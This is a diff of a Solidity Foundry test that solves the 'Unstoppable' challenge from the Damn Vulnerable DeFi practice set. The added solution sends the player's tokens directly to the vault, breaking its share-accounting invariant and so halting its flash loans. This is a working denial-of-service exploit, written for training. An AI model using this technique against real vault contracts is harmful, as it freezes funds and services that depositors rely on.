@@ -3,9 +3,10 @@
 pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
-import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
+import {DamnValuableToken, ERC20} from "../../src/DamnValuableToken.sol";
 import {UnstoppableVault, Owned} from "../../src/unstoppable/UnstoppableVault.sol";
 import {UnstoppableMonitor} from "../../src/unstoppable/UnstoppableMonitor.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156.sol";
 
 contract UnstoppableChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -92,7 +93,9 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        
+        require(token.transfer(address(vault), INITIAL_PLAYER_TOKEN_BALANCE));
+        console.log(vault.totalAssets());
+        console.log(vault.totalSupply());
     }
 
     /**
@@ -110,3 +113,4 @@ contract UnstoppableChallenge is Test {
         assertEq(vault.owner(), deployer, "Vault did not change owner");
     }
 }
+
